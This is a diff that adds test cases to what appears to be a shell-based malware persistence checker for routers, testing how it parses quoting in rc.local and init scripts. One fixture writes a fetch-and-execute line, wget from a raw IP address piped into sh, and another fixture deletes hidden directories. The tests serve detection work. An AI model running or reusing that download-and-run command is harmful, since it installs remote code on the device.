@@ -411,6 +411,24 @@ expect "echo >> crontab and a pipe into crontab - put the malware back: IOC pers
 expect "a comment written into rc.local starts nothing" '! grep -q "IOC .*ew-own" "$D/check.txt"'
 umount "$D/m"
 
+echo "=== quotes are read as sh reads them (review of 2.54)"
+D=$(mkscen quotes "$OWL"); U=$D/u
+mkdir -p "$U/etc/init.d"
+printf 'wget -qO- "http://65.20.71.131:8000/ni.sh?id=1&arch=arm" | sh\nexit 0\n' >"$U/etc/rc.local"
+printf '#!/bin/sh /etc/rc.common\nstart() {\n\techo "start #1"; /etc/config/.gl/run.sh\n}\n' >"$U/etc/init.d/qhash"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+expect "a quoted & does not cut the fetch off: IOC persist-ref" '[ $rc = 1 ] && grep -A1 "IOC  *persist-ref  */etc/rc.local" "$D/check.txt" | grep -q "fetches from a server"'
+expect "a quoted # starts no comment: IOC persist-ref" 'grep -q "IOC  *persist-ref  */etc/init.d/qhash" "$D/check.txt"'
+umount "$D/m"
+D=$(mkscen quotes2 "$OWL"); U=$D/u
+mkdir -p "$U/etc"
+printf 'DIRS="/etc/config/.gl/\n/etc/glinet/.cache/gb"\nfor d in $DIRS; do rm -rf "$d"; done\ncat <<EOF >/tmp/ioc-paths\n/etc/config/.gl/gl-helper\nEOF\nlogger "guard:\ngl-helper not found"\nexit 0\n' >"$U/etc/rc.local"
+mnt "$D" "$OWL"
+run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
+expect "a string over two lines and a here-document are not commands: no IOC (exit 0)" '[ $rc = 0 ] && ! grep -q "^ *IOC " "$D/check.txt" && grep -q "PERSIST  *persistence  */etc/rc.local" "$D/check.txt"'
+umount "$D/m"
+
 echo "=== gl-helper under another name, known by its packer (topic 73056, post 94)"
 D=$(mkscen npk "$OWL"); U=$D/u
 mkdir -p "$U/usr/sbin" "$U/root" "$U/etc/svc"
